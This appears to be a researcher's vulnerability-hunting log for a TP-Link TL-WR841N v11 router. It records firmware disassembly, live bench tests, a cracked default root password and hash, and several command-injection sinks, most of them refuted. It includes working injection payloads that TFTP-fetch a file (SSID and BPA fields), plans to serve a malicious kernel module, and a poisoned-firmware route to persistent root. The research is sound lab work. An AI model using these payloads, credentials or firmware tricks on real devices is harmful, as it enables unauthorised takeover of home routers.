# TL-WR841N v11 (Stock 160325) — Root/Privesc Vector Log

Status: **Partially validated on the physical device** (live sessions 2026-09-12). Static code paths are firmware facts; empirical claims are flagged VALIDATED / REFUTED / PENDING.
Source data: stock firmware `wr841n_v11_160325.bin`, extracted rootfs `/tmp/fw/stock/root`, kernel vmlinux `/tmp/fw/stock/kernel.out`, httpd binary `/tmp/fw/stock/root/usr/bin/httpd`.

CAVEAT (session "auth quirk", Sec 12): live-web observations may be contaminated — the IP 192.168.0.1 was discovered to have reverted to the **home router**, not the TL-WR841N, mid-enumeration. Only firmware-static analysis in Sec 2-11 is trusted; Sec 12's live session/token results must be **re-verified against the actual WR841N** before drawing conclusions. The command-injection sinks themselves (Sec 4-9) are static code facts and stand regardless.

UPDATE 2026-09-12 (on-bench live session): The unit was connected directly on eth1 (192.168.0.100), firmware confirmed "3.16.9 Build 160325 Rel.62500n", board "WR841N v11". Web auth flow fully worked (tokenized URLs + Referer). Live verdicts that change the static analysis:
- **SSID injection (Sec 4): EMPIRICALLY REFUTED** — a stored `$(sleep 30)`-style SSID is stored literally in config but **never shell-executed** at save or boot. Root cause: the `iwconfig %s essid %s` sink in wlanInit reads the ssid from a **runtime per-interface struct** (`ucWlanGetSsid`, base 0x5cb0b0, ssid @ +0x1c) which is not rebuilt from the web-saved config at boot in AP-client mode. Also a **server-side 32-byte SSID cap** silently rejects longer payloads.
- **MAC clone (Sec 5), tp_domain (Sec 6), nameserver (Sec 7): static-only**, sinks feed binary MAC / getDefaultLanDomain / inet_ntoa — not web free-text (see notes in each sec). Live tests NOT yet done for MacClone/WAN.
- **NEW: Diagnostic ping page = NOT a shell sink (Sec 15 CORRECTED 2026-09-12).** The ping6 `system()` sink (`fcn.0047f4e4`) is called ONLY by the hardcoded IPv6 connectivity check (`swIpv6.c`, `ipv6.google.com`/`test-ipv6.com`/runtime IPv6 DNS) — the web `/userRpm/PingIframeRpm.htm` path uses raw-socket ICMP (`lowLayerPing`, no shell). Empirically `$(tftp ...)` in ping_addr yielded HTTP 200 with no TFTP callback. The repeated-`isNew=new` httpd worker wedge is real (DoS) but NOT injection evidence.
- **NEW: BPA (BigPond) WAN-mode command injection (Sec 17) — leading novel candidate.** Web fields `usr`/`pwd`/`AuthSrv`/`AuthDomain` -> BPA cfg struct (offsets 0x0/0x19/0x32/0x82) with NO sanitization -> `bpalogin user %s password %s authserver "%s" authdomain "%s"` built unescaped (VA 0x57d970/0x57d990) -> `tp_systemEx` (`/bin/sh -c`) on DHCP-OK link-up. Live proof pending (requires WAN-mode switch to BPA — disruptive).
- **NEW: PPTP injection REFUTED (Sec 18)** — user/pass getConvertAsciiCode-escaped, server field IP-validated.
- **NEW: nmap full service map (Sec 16):** only 22/tcp (dropbear 2012.55), 80/tcp (httpd), 1900/tcp (upnpd) open; UDP silent except 1900. dropbear **is running** on this unit.
- **BACKUP (Sec 19):** TFTP recovery-mode poisoned-stock-firmware route for persistent root if every web/SSH/ART vector is exhausted (user-authored contingency).

---

## 0. Executive Summary

The stock firmware exposes a very large remote-command-execution surface **inside `httpd` itself** (the web server, which runs as root). The firmware carries **QCA ART factory-test tooling** embedded in `httpd` that can TFTP-pull and `insmod` an arbitrary kernel module. Default **root shell password cracked: `sohoadmin`**. No SSH/Telnet by default, so a web-layer injection gives root directly (httpd runs as root).

Key novel findings:
1. **ART toolkit embedded in httpd** — TFTP-downloads `art.ko` (kernel module) and `nart.out` (executable), then `insmod`/execs them as root. (Sec 3)
2. **`iwconfig %s essid %s` command-injection sink** — unquoted SSID string, classic TP-Link sink. **EMPIRICALLY REFUTED as web-reachable** (runtime struct not fed from web config; 32-byte server cap). (Sec 4)
3. **`ifconfig %s hw ether %s`** — MAC-clone sink; feeds binary MAC via swMac2Str, not raw web text. (Sec 5)
4. **`insmod ... tp_domain.ko lan_domain=%s`** — domain-name sink; sourced from getDefaultLanDomain, not a web param. (Sec 6)
5. **`echo "nameserver %s"`** — DNS sink; DNS via inet_ntoa dotted-quad only. (Sec 7)
6. **`route add -net %s netmask %s gw %s dev %s`** — static route sink. (Sec 8)
7. **`arping -I %s -c 1 %s`** — MUD/factory detection sink. (Sec 9)
8. **Kernel 2.6.31** — ancient, many CVEs; modules loadable (insmod used in boot + sinks). (Sec 10)
9. **Root password `sohoadmin`** — Matches QCA/RT-N* default. dropbear 2012.55 runs (nmap). (Sec 2)
10. **NEW (2026-09-12, CORRECTED): Diagnostic `PingIframeRpm` = raw-socket, NOT a shell sink** — the ping6 `system()` sink is only reachable via the hardcoded IPv6 connectivity check; web `ping_addr` goes to `lowLayerPing` (SOCK_RAW), no shell. The observed httpd worker wedge = DoS only. (Sec 15)
11. **NEW (2026-09-12): BPA WAN-mode command injection — leading novel candidate** — web `usr/pwd/AuthSrv/AuthDomain` -> BPA cfg struct (no sanitization) -> unescaped `bpalogin` shell cmd -> `tp_systemEx` on DHCP-OK. Live repro pending (requires disruptive WAN change). NOTE (pm): trigger refined — event `0x1200000a` is a shared periodic second-tick family and exec happens **only when the BPA link is DOWN**; see Sec 22 + `evidence/live_wan/`.
12. **NEW (2026-09-12): PPTP REFUTED** — user/pass escaped, server IP-validated. (Sec 18)
13. **BACKUP (Sec 19): TFTP recovery-mode poisoned-stock-firmware** for persistent root if all else fails.
14. **NEW: nmap full TCP + UDP service map** — 22/80/1900 only. (Sec 16)

---

## 1. Credentials: Root Password Cracked

| Field | Value |
|---|---|
| /etc/passwd root hash | `$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/` |
| Cracked password | **`sohoadmin`** |
| Method | ctypes -> libcrypt crypt(3) MD5 check (python3 `crypt` module absent on Python 3.13) |
| Web login | admin/admin (known, separate from root pw) |

Implication: if any shell vector is found (web injection, dropbear, telnetd), `root:sohoadmin` works for local shell. Web httpd runs as root, so a web-UI command injection = root immediately. This pw may ALSO be worked into other vectors (e.g., if a service asks for root pw, or config backup restore).

> NOTE: root hash present in `etc/shadow`; no `/etc/passwd` root entry? Verify mount/passwd layout on device. Dropbearmulti contains RSA/DSA private key *strings* but config may live elsewhere — see Sec 11.

---

## 2. Firmware Layout & Boot (context for all vectors)

- **Kernel**: `Linux version 2.6.31 (tomcat@buildserver) (gcc version 4.3.3 (GCC)) #13 Fri Mar 25 17:10:18 CST 2016`, MIPS32_R2, `mod_unload MIPS32_R2 32BIT` (module loading possible).
- **Cmdline**: `console=ttyS0,115200 root=31:2 rootfstype=squashfs init=/sbin/init mtdparts=ath-nor0:128k(u-boot),1024k(kernel),2816k(rootfs),64k(config),64k(art) mem=32M`
- **mtdparts** note: separate `art` partition (64k) — ART calibration data. Interesting for the ART loader (Sec 3).
- **Boot**: `etc/rc.d/rcS` starts `/usr/bin/httpd`; telnetd gated by compile-time constant `0x8400000` via `getTelnetSvr` (0x004eb378) — likely disabled.
- **Interfaces**: `br0` (LAN bridge, eth1 + ath0), WAN separate. Config domain files like `/tmp/*.conf` / `/etc/ath/default_*`.
- **Modules in rootfs**: `net/umac.ko, ath_rate_atheros.ko, ath_hal.ko, ath_dev.ko, asf.ko, art-honeybee-2.0.ko, ag7240_mod.ko, adf.ko`, plus ~40 `kernel/*.ko` (xt_*, tp_domain, tunnel4/sit, pptp, pppol2tp, etc.).

---

## 3. **HIGH-VALUE / NOVEL: ART Toolkit TFTP Loader in httpd (kernel module load + exec as root)**

Decoded from httpd strings + disasm:

```
tftp -g %s -r %s -l /tmp/art.ko
insmod /tmp/art.ko
tftp -g %s -r %s/honeybee_2_0_0_1.ko -l /tmp/art-honeybee-2.0.ko
insmod /tmp/art-honeybee-2.0.ko
tftp -g %s -r %s/art_ap123.ko -l /tmp/art.ko
tftp -g %s -r %s/libanwi.so -l /tmp/libanwi.so
tftp -g %s -r %s/libpart.so -l /tmp/libpart.so
tftp -g %s -r %s/nart.out -l /tmp/nart.out
chmod +x /tmp/nart.out
/tmp/nart.out -instance 0 &
/tmp/nart.out -instance 1 &
LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH
```

- **Flow**: `sym.wlanInit` (0x4aa294) -> branch when `fcn.0049f960` returns nonzero (board type != normal?) -> `power_led_fast_blink` -> **`fcn.004a3ab4`** ("Start ART...") at 0x4a3ab4 -> `fcn.0049ff4c` (module loader, tftp at 0x4a03e0-0x4a03f4).
- **TFTP server IP source**: s4 (a2 arg of `tftp -g %s ...`). Candidate defaults in strings: `192.168.0.222`, `192.168.1.222`, `192.168.10.222` (QCA factory `.222` convention) — **server IP likely static default, not user-controlled**. Filename arg s1 = module filename (`art.ko` / `art-honeybee-2.0.ko`).
- **Name references**: `art.ko`, `umac`, `findSystemModule`, `swWlanApDownAll`, `/tmp/nart.out`, `nart.out`, `mdk_client.out` is a separate MIKO test tool (`mdk_client` — see strings).

**Exploit potential (hypothesis):**
- If ART mode can be switched on (board-type spoof via config/sysctl, factory mode set via a web page, or if `art` mtd partition contents gate it) → device TFTP-pulls a **kernel module `art.ko`** we host → `insmod` = **arbitrary kernel code exec as root**. That is a full kernel-level compromise.
- Even if ART mode is factory-only, the sink code + strings prove the primitive exists. Verdict: **needs trigger investigation** — they matter for kernel-privesc because module load = kernel RCE from userspace root.
- `power_led_fast_blink` immediately before `Start ART...` suggests the LED blink is the factory entry signal. Verify trigger on device (hold reset? a config value?).

**Next action**: find what sets `fcn.0049f960` return path (board type? `artBoot` config?), find where the `.222` server IP is hardcoded vs. from config, check whether `art` mtd content or env (`CONFIG_*`) gates it. grep for `mdk` strings to find the MIKO client trigger.

---

## 4. High: `iwconfig %s essid %s` — SSID Command Injection (classic TP-Link sink)

- **Format string** (VA 0x574720 region): `managed\0iwconfig ath%d essid %s\0ifconfig %s hw ether %s\0iwconfig ath%d ap %s\0iwpriv ath%d ignore11d %d...`
- **Callers**: `sym.wlanInit` (0x4aa294), `sym.wlanMakeVap` (0x4a5730), `fcn.0049e8b4`, `fcn.004a72bc` (from earlier string-xref analysis; branch code observed).
- **Web page**: `/userRpm/WlanNetworkRpm.htm` (SSID form fields `ssid1..ssid4`, `Save`). SSID arrives as raw string param.
- **Vuln class**: unsanitized string placed unquoted in a `system()`/`execFormatCmd` shell command. Backtick/`;`/`$()` injection in SSID → command exec.
- **But**: TP-Link requires SSID 1–32 bytes printable; enforcement is client-side JS in the htm? Check WlanNetworkRpm.htm JS validation. If only client-side → bypassable directly via HTTP POST (no JS). **Must verify server accepts arbitrary SSID bytes.**
- This is the SAME class documented for the v14 MT7628 unit in `testing_notes.md` (there it reached `util_execSystem`). For v11 the sink is `iwconfig ath%d essid %s` inside httpd.

**Challenge**: SSID is normally passed via `ssid` config into `wlanMakeVap`/`wlanInit` from config, not directly from the web page. Need to trace `/userRpm/WlanNetworkRpm.htm` param -> config write -> wlanInit config re-read. TP-Link commonly: WEB handler writes config blob to flash, then calls `wlanInit` reprocessing. Verify the exact input->sink data flow on-device via strace of httpd over UART (install strace? probably not present; use ptrace-less log %s?).

**LIVE VERDICT (2026-09-12): EMPIRICALLY REFUTED as web-reachable.**
- `WlanNetworkRpm.htm` SSID parameter set `8,0,"<ssid>";...;Save=Save` was used to store `$(sleep 30)` and `$(tftp -r pwn 192.168.0.100)`-class payloads.
- Stored value persists (StatusRpm shows it) → config write path WORKS, so we reached the same store the boot path reads.
- **Server-side 32-byte SSID cap**: payload >32 bytes is silently rejected (`errCode`) — a 40-char `$(tftp -g ...)` payload never commits; the 28-char `$(tftp -r pwn 192.168.0.100)` commits but never executes.
- **No shell execution**: no TFTP UDP69 callback within 35s of Save, and none across a power-cycle (40s watch). Sleep-payload timing showed no inline hang on Save (responds ~0.35s) and no extended boot time difference.
- **Static root cause**: the iwconfig sink at 0x4aa280-0x4aa294 reads the SSID via `ucWlanGetSsid(0)` (0x48de90) from a **runtime wlan struct array** (base ptr 0x5cb0b0, 0x17c-byte per-iface struct, ssid @ +0x1c). Web Save writes only the config store; the live struct the iwconfig sink reads is **not rebuilt from web-saved config at boot** in AP-client mode (mode 4). Evidence: `evidence/disasm/ucWlanGetSsid_struct_read.s`, `wlanInit_essid_sink.s`, `wlanStrToChars_conv.s`.
- Conclusion: SSID stored literal, never shell-executed at save or boot on this unit/firmware. Not a live RCE vector.

---

## 5. High: `ifconfig %s hw ether %s` — MAC Clone Command Injection

- **Format string**: `ifconfig %s hw ether %s` (VA 0x574728).
- **Sinks**: `sym.setMac` (0x4b4f74, `ifconfig %s hw ether %s` where a3=s0=MAC), `fcn.004a472c` (same at 0x4a4904).
- **Web page**: `/userRpm/MacCloneCfgRpm.htm` (`CloneMAC`, `pcmac`, `Save`). Also used by `ucActiveCloneWanMac` (0x487208) & `ucActiveCloneWlanWanMac` (0x48743c) — the WAN/WLAN MAC clone features.
- **Vuln class**: MAC string parameter injected into `ifconfig` shell line. MACs are hex/colon-limited normally; server-side validation? TP-Link usually validates MAC format server side (`%02X:%02X...` used for iwpriv setHwaddr path), but the `ifconfig %s hw ether %s` path receives the raw cloned MAC param. **Test**: submit `CloneMAC=00:11:22:33:44:55;cmd;` form values.
- **Static disposition (2026-09-12)**: both sinks (`sym.setMac` 0x4b4f74, `fcn.004a472c` @0x4a4900) feed the MAC via `swMac2Str` (0x47420c) which converts a **binary MAC struct** to hex string — no raw web free-text reaches the `ifconfig %s hw ether %s` format. Live injection test PENDING but static path is low value. Evidence `mac_clone_ifconfig_sink.s`, `mac_clone_setMac_sink.s`.

---

## 6. Medium-High: `insmod ... tp_domain.ko lan_domain=%s` — LAN Domain Injection

Format strings:
```
insmod /lib/modules/2.6.31/kernel/tp_domain.ko lan_domain=%s ap_oper_mode=%d link_status=1
insmod /lib/modules/2.6.31/kernel/tp_domain.ko lan_domain=%s lan_new_domain=%s ap_oper_mode=%d link_status=%d
insmod /lib/modules/2.6.31/kernel/tp_domain.ko  lan_ip=%u lan_domain=%s lan_new_domain=%s
```
- **Sink**: `sym.resetTpdomain` (0x4842c0) — called when LAN domain name config changes (/userRpm/* DHCP/LAN page?). tp_domain inserts a domain via kernel module args — a module param string injection.
- **Static disposition (2026-09-12)**: sole code ref to the `insmod ... lan_domain=%s` fmt (0x571708) is `fcn.00486fd8` feeding `getDefaultLanDomain` / `swGetWlanApOperMode` — NOT a web parameter. Not injection-reachable. Evidence `lan_domain_tp_domain_sink.s`.
- **Vuln class**: kernel `insmod` parameter `%s` unsanitized; `lan_domain` sourced from LAN "Domain Name" web field (DHCP server config page). Injection into insmod param string — module args go through `/sbin/insmod` argv, so shell injection chars have effect only via shell interpretation? insmod argv isn't shell-parsed → direct arg, so this is **argv injection**, not shell. Egg: `lan_domain=` can be `a;touch /tmp/pwn` — argv `;...` is literal. **Lower value** unless insmod is invoked via shell (`sh -c`). Confirm execFormatCmd wrapper uses `/bin/sh`.

---

## 7. Medium: `echo "nameserver %s"` — DNS nameserver injection

```
echo "nameserver %s" > %s
echo "nameserver %s" >> %s
```
- DNS config fed from WAN DHCP/DHCPv6 (attacker controls a DHCP server on the WAN side in test setups) or LAN "Primary/Secondary DNS" fields. If attacker-controlled host can influence this (e.g., act as WAN DHCP with malicious DNS string) → injection. Given httpd runs as root, this is a remote pre-auth-ish (WAN-facing DHCP) injection IF the WAN-side string is unsanitized. **Medium** — most DNS entries come from DHCP numeric IPs, but LAN static DNS fields are user-typed strings.
- **Static disposition (2026-09-12)**: `setRuntimeDns` (0x4b4410) builds `echo "nameserver %s " > %s` but the value comes from `inet_ntoa` (dotted-quad) — no shell metacharacters possible. Not injectable. Evidence `setRuntimeDns_nameserver.s`.

---

## 8. Medium: `route add -net %s netmask %s gw %s dev %s` — Static Route injection

- **Sink**: `fcn.004ea7d8` (0x4ea990 `route add -net %s netmask %s gw %s dev %s`, also `ip route`/`route` variants: `route add -net %s netmask %s gw %s dev %s`).
- **Web page**: `/userRpm/StaticRouteTableRpm.htm` (dest IP/netmask/gw user-typed). IPs are dotted-quad; server-side IPv4 parse usually enforces format. **Test**: values with `;cmd` in gw field.

---

## 9. Medium: `arping -I %s -c 1 %s` — MUD/ARP detection sink

- **Sink**: `fcn.004a3ab4` (`arping -I %s -c 1 %s` at 0x4a3cf0); `mudCreate` (0x525990, `arping -I %s -c 1 -w 1 %s`). MUD = TP-Link "Multi-user Detection" / guest isolation check. Ifname param from config; IP from live ARP target (not user free-text).
- Also seen (in ART func): `brctl addif %s %s` (0x4a3ca0), `arping -I %s -c 1 %s` — eth1/br0 names static.
- Lower value — interface names fixed.

---

## 10. Kernel 2.6.31 Privesc (from userspace shell)

If ANY web/ART/`sohoadmin` shell is obtained, kernel 2.6.31 MIPS has aged CVEs. Not all apply to MIPS/native 2.6.31. Candidates worth assessing:
- Known 2.6.31-era MIPS-relevant: sock_sendpage (CVE-2009-2692), TUN/TAP setlease, xt_table mutex (older), compat tasks. These are userspace-triggerable but need a local shell first.
- Modules are loadable → **if local root shell** (or even unprivileged with modules allowed), and **if ART loader or `insmod` sink reachable**, kernel module injection = guaranteed kernel privesc. This elevates every shell vector to "kernel too".
- Kernel lacks embedded `.config`/ikconfig so exact enabled feats unknown (strings scan found none). Suggest: check `/proc/config.gz` on device, or test module autoload by writing `.ko`.

**Recommendation**: kernel CVE assessment deferred until we have a shell; the higher-value play is the web-layer sinks + ART loader.

---

## 11. Other Service/Attack Surfaces

- **dropbearmulti (`/usr/sbin/dropbearmulti`)**: present, contains RSA+DSA private key headers. **LIVE 2026-09-12: dropbear 2012.55 IS running** (nmap 22/tcp open). SSH handshake attempt reset mid-KEX at the bench — retry with explicit cipher (aes128-ctr) + `root:sohoadmin`. If it accepts root, instant root. (Best next live test.)
- **telnetd**: gated by compile-time `0x8400000` in `getTelnetSvr` (0x4eb378). nmap shows no telnet port open → not running by default.
- **hostapd** (`Xr5.7`/sony build): WPA/WPS handling; WPS PIN attacks (PixieDust) — no WPS on WR841N by default? `wsc_config.txt` exists (USE_UPNP=1). WPS PIN bruteforce / Pixie Dust class attack on the router's WPS (external, no shell needed, but result = PSK not root).
- **UPnP**: `wsc_config.txt USE_UPNP=1`, httpd handles IGD via `mudCreate` pipes (`/tmp/pipe_mud`). UPnP SOAP unauthenticated port-mapping via `igdAddPortMapping` adds iptables rules with `-d %s` (dst IP string from SOAP). Injection in UPnP SOAP fields → command exec? **Worth testing** — UPnP is typically unauthenticated on LAN.
- **IPv6**: `ping6 -I %s %s` fixed hosts (gateway/ipv6.google.com/test-ipv6.com) — low value.
- **Config restore**: `/userRpm/ManageCfgRpm.htm`? backup→restore config upload — TP-Link config restore historically can plant values; not directly exec.
- **WPS**: `wsc_config.txt` (Sec above).
- **`usr/arp`, `usr/net_ioctl`, `usr/arp`**: custom binaries — likely wrappers httpd uses; not obviously exploitable. net_ioctl is 4KB — investigate strings for extra surface.

---

## 12. Web-Auth Model (needed to exploit the above)

- Login: `GET /userRpm/LoginRpm.htm?Save=Save` with cookie `Authorization=Basic%20base64("admin:"+MD5(admin))`.
- Server responds: `<script>window.parent.location.href = "http://192.168.0.1/<16-char-session-token>/userRpm/Index.htm"</script>`.
- Tokenized URL root: `/<TOKEN>/userRpm/*.htm`. **Live-verified 2026-09-12**: this model works — a fresh 16-char token per login; pages under `/<TOKEN>/userRpm/` return full content when the request carries `Referer: http://192.168.0.1/<TOKEN>/userRpm/Index.htm`. StatusRpm=25756B OK. Save success = `var errCode = "26113"`.
- The earlier 68-byte `no authority` / 202B quirks were session-stale or missing-Referer artifacts, not a blocker.

---

## 13. Proposed Live-Test Plan (once device is on bench / web session resolved)

Priority order:
1. ~~Resolve session token quirk~~ **DONE 2026-09-12**: tokenized URL root + Referer works (see Sec 12 / evidence/live_web).
2. ~~WlanNetworkRpm SSID injection~~ **DONE — REFUTED**: stored literal, never exec'd (Sec 4).
3. MacCloneCfgRpm `CloneMAC` injection — PENDING (sink uses swMac2Str binary MAC; likely not injectable).
4. **UPnP SOAP** `igdAddPortMapping` dest-IP injection (unauthenticated LAN, nmap: 1900 open) — PENDING.
5. **dropbear 2012.55 runs; try `root:sohoadmin` via SSH with explicit cipher** (nmap found 22/tcp) — PENDING.
6. ART mode trigger hunt: hold-reset LED blink behavior, `art` mtd write, `ps w` for ART-mode indicator; sniff for TFTP requests to `*.222` on factory-mode entry — serve malicious `art.ko`, observe `insmod` load (root kernel exec).
7. **Diagnostic ping** ~~system() sink~~ — **CORRECTED 2026-09-12: raw-socket, no shell** (Sec 15). Drop any payload testing; the wedge is DoS-only.
8. StaticRoute / QoS / nameserver injection PENDING (post-auth, once dropbear/ssh shell or UART available).
9. **BPA cmd injection (Sec 17)** — switch WAN type to BPA, arm TFTP listener, POST payload in `usr`/`AuthSrv`, trigger DHCP-OK link-up. **Disruptive — coordinate first.**

---

## 14. Artifacts

| Artifact | Location |
|---|---|
| Extracted rootfs | `/tmp/fw/stock/root` |
| Kernel vmlinux | `/tmp/fw/stock/kernel.out` |
| httpd strings | `/tmp/fw/httpd_strings.txt` |
| system/popen call sites | `/tmp/fw/system_callsites.txt` |
| per-site disasm | `/tmp/fw/dasm_all.out` |
| mithril results | `/tmp/fw/mithril_rootfs.json` |
| authed Index.htm capture | `/tmp/routerenum/authed_index.png` |
| auth helper | `/tmp/routerenum/r.sh` |
| v14 SSID notes (different unit) | `testing_notes/testing_notes.md` |
| disasm evidence (this session) | `evidence/disasm/*.s` |
| nmap evidence (this session) | `evidence/nmap/` |
| live web evidence (this session) | `evidence/live_web/` |

---

## 15. Diagnostic `PingIframeRpm` — **CORRECTED 2026-09-12: NOT a shell sink on this build**

- **CORRECTION**: earlier note attributed web `ping_addr` -> `fcn.0047f4e4` -> `system("ping6 -I %s %s ...")`. **This is WRONG for this firmware.**
- **Who the ping6 `system()` sink really is**: `fcn.0047f4e4` (0x47f4e4) builds `ping6 -I %s %s -i 1 -c 5 > /tmp/ping6.txt` (VA 0x570708) + `system()`. Its **ONLY callers** are `fcn.004810d4` @ 0x4813f0 / 0x481408 / 0x48141c — the **IPv6 connectivity check** (`swIpv6.c`) which uses **hardcoded** `ipv6.google.com` (0x570b18) / `test-ipv6.com` (0x570b28) / runtime IPv6 DNS (via `getaddrinfo` `pdnsIPv6Addr`). NOT a web `ping_addr` path. Evidence: `axt 0x0047f4e4` shows only these three call sites.
- **What the web diagnostic actually uses**: `/userRpm/PingIframeRpm.htm` (handler reg by `httpPingIframeInit` -> 0x455ba0) drives `swDiagnosticSendOp` / `swChkPingStop`; the real ICMP work runs in `diagnosticThread` (0x4c120c) -> **`lowLayerPing` (0x4c02fc)**: raw `SOCK_RAW` socket + `ioctl` + `select` + `recvfrom`, `/var/diagno` UNIX socket — **NO `system()` / NO shell** anywhere in the diagnostic path. Tracert likewise in-process (no shell `traceroute`).
- **Empirical corroboration**: `$(tftp ...)` in ping_addr -> HTTP 200, **NO TFTP callback** — fully consistent with a raw-socket ping, not a shell sink.
- **Ops hazard (live-verified, real)**: repeated `isNew=new` **wedges httpd's single worker** (TCP 80 accepts but never replies; kernel still answers ICMP/ARP; recovery only by power-cycle). This is a real web-tier DoS observation, but **not** evidence of shell exec.
- Evidence: `evidence/disasm/httpPingAndTracert_iframe_system_sink.s` (contains the now-supplanted attribution — web page is socket-based; keep for history), `evidence/disasm/ipv6_check_hardcoded_dns.s` (correct), `evidence/disasm/lowLayerPing_rawsocket.s` (new).
- **Disposition**: NOT a command-injection vector. Do not re-test.

---

## 16. NEW: nmap Live Service Map — 22/tcp, 80/tcp, 1900/tcp only

Performed 2026-09-12 from the bench workstation (nmap 7.99, --privileged, -Pn). Evidence: `evidence/nmap/*`.

| Port | State | Service / Ver |
|---|---|---|
| 22/tcp | open | ssh — Dropbear sshd 2012.55 (protocol 2.0) |
| 80/tcp | open | http — "TP-LINK WR841N WAP http config" |
| 1900/tcp | open | upnp — ipOS upnpd (TL-WR841N WAP 11.0; UPnP 1.0) |
| 1900/udp | open | upnp (SSDP) |
| 23/tcp, 2323, 161/udp, etc. | closed / silent | — |

Remarks:
- **dropbear IS running** on this unit (was doubtful in Sec 11). `root:sohoadmin` may work against it — SSH handshake was attempted but reset mid-KEX; retry with explicit cipher/askpass. If dropbear takes root, that's instant root (Sec 1/11).
- Full 1-65535 TCP SYN = only 22/80/1900. This rules out any other open telnetd/sshd side channel (telnetd not running).
- UPnP IGD SOAP on 1900 : `igdAddPortMapping` adds iptables rules with `-d %s` from SOAP — unauthenticated LAN surface, follow-up from Sec 11.
- SSDP unicast M-SEARCH from the bench produced no response; UPnP service tree still reachable on 1900/tcp per nmap detection.
## 17. NEW (2026-09-12): BPA WAN-mode Command Injection — **leading novel candidate** (static-complete, live PENDING)

**Chain (all offsets/strings verified in disasm):**
```
web POST /userRpm/BPACfgRpm.htm?wan=0&wantype=5&usr=<pa>&pwd=<pb>&AuthSrv=<pc>&AuthDomain=<pd>&...&Save=Save
  -> fcn.0042dd10 (BPACfgRpm handler; reg by httpBPACfgInit 0x42dc78)
       reads env keys: "Save", "Connect", "usr" (0x57ef18), "pwd" (0x57ef24),
                        "AuthSrv" (0x56a5d4), "AuthDomain" (0x56a5dc), "wan", "mtu", "linktype", "waittime", "waittime2"
       strncpy into BPA cfg struct (sp+0xb4, size 0xe4):
         usr        -> +0x00 (len 0x18)
         pwd        -> +0x19 (len 0x18)
         AuthSrv    -> +0x32 (len 0x4f)
         AuthDomain -> +0x82 (len 0x4f)
  -> swSetBpaCfg (0x47dcb8) [strcmp-change-gated] -> swSwitchWanType
  -> ucSetBpaCfg (0x496000)  **NO SANITIZATION** (memcmp + memcpy, no metachar filter)
  -> bpaActiveCfg (0x4e4904) -> pppUserStart (sets usrManual flag)
  ...link-up / DHCP-OK on proc table 0x409da8 -> bpaStartAfterDhcpOk (0x4e4934)
  -> swGetBpaCfg(sp+0x88) -> fcn.004e46a4 (bpalogin cmd builder):
     sprintf(buf, "bpalogin user %s password %s"       , cfg+0x00, cfg+0x19)   // VA 0x57d970
     sprintf(buf, " authserver \"%s\" authdomain \"%s\"", cfg+0x32, cfg+0x82)  // VA 0x57d990
     sprintf(buf, " httpd-pid %d", *linkModeThreadPid)
     **ARGUMENTS ARE RAW POINTERS INTO THE CFG STRUCT — NO getConvertAsciiCode / NO escaping ANYWHERE**
  -> caller bpaStartAfterDhcpOk @ 0x4e4ad0 -> tp_systemEx(buf)   // fork + /bin/sh -c
```
- **Field offsets match exactly** the web-to-struct offsets (0x0/0x19/0x32/0x82) — no transformation layer, no sanity check on the four strings (only JS client-side `maxlength`/required; server cap 0x18/0x18/0x4f/0x4f via strncpy).
- **BPA = WAN type 5** (`webWanTypeAdd(a0=5)` in init; page wantypeinfo `5,"BPACfgRpm.htm"`; wanType[5] = "BigPond Cable"). Selectable from `WanCfgRpm.htm` WAN Connection Type dropdown. Page live-served: `GET .../BPACfgRpm.htm?wan=1` -> 200, 12851B, fields `usr/pwd/AuthSrv/AuthDomain` present.
- **`bpalogin` binary exists** in rootfs `/usr/sbin/bpalogin` (25023B). Program is the BigPond (Australia) cable login client — real, so the command is not dead code.
- **Trigger requirement**: exec fires in `bpaStartAfterDhcpOk`, i.e. BPA link-up after DHCP-OK. On a bench this needs the WAN side to actually DHCP (or BPA link state to become reachable). Web Save alone sets config + usrManual; the exec is on the DHCP-OK proc-table dispatch. **Live repro needs WAN-mode switch to BPA — disruptive to current AP-client mode (wanPara[0]=4); coordinate with user before running.**
- **Payload shape** (usr/pwd 15-char client cap but server reads raw up to 0x18; AuthSrv/AuthDomain 32 char client cap, server 0x4f):
  ```
  usr = x";tftp -g 192.168.0.100 -r pwn -l /tmp/pwn;#"
  ```
  Since the whole line runs via `sh -c`, `"` closes the quote and `;` runs the second command. Field choice: usr/pwd break out of the unquoted `user %s` / `password %s` slot; AuthSrv/AuthDomain sit inside `"..."` but still shell-addressable (closing `"` + `;cmd`).
- **Honesty**: this is still the *web-stored-param -> shell command-injection* class (adjacent to the documented SSID/ping CVEs). "Novel" only in the **specific field/sink combination** (BPA cfg fields -> bpalogin cmd) which is **not** in the documented CVE set for this build. Do not overclaim: it is a different sink+field, not a new vuln class. Still worth running to completion — an RCE that actually shells out as root on the stock image is the goal.
- Evidence: `evidence/disasm/bpa_handler_web_fields.s`, `evidence/disasm/bpa_bpalogin_builder.s`, `evidence/disasm/bpaStartAfterDhcpOk.s`, `evidence/live_web/BPACfgRpm.html`.

---

## 18. NEW (2026-09-12): PPTP injection — **REFUTED** (static)

- Sink found: `fcn.004e12fc` -> `pptpCmdReq` (0x4e1584) builds `pppd pptp pptp_server %s user "%s" password "%s" ...` (VA 0x57dead/0x57def8 region), executed via `tp_systemEx`. Notionally the web PPTP page (`PPTPCfgRpm.htm`) feeds server/user/pass.
- **Both user fields are SHELL-ESCAPED**: `getConvertAsciiCode` (0x4cb154) backslash-escapes **every** input byte (`\X`) before `user "%s"` / `password "%s"`. Injection chars are neutralized inside the double quotes.
- **Server field is IP-enforced**: `swChkPptpDomain` (0x47adb4) validates pptp_server (s2+0x1c) as dotted-quad via `swChkDotIpAddr`->`inet_addr`->`swChkLegalIpAddr`; only `[0-9.]` reach `pptp_server %s` (unquoted). Not injectable.
- **Disposition**: PPTP is dead on this build. Do not re-test.
- Evidence: `pptp_builder_escaped.s`, `swChkPptpDomain.s`.

---

## 19. BACKUP PLAN: TFTP recovery-mode poisoned stock firmware (user-precaution)

If **every** web/SSH/ART vector above is empirically exhausted with no root shell, fallback per user:
- Use the unit's **TFTP firmware-recovery path** (u-boot rescue: hold reset at power-on / WPS button sequence, device acts as TFTP *client* pulling a user image, or u-boot accepts `tftp ... bootm`).
- Serve a **patched stock image**: original 160325 squashfs, with the init script (`etc/rc.d/rcS`) or `httpd` startup augmented to (a) write a world-accessible `/tmp/passwd` root shell line, (b) enable telnetd, (c) drop a setuid-root binary or a `/tmp` auto-run root shell — i.e. "immediately allows root access after booting."
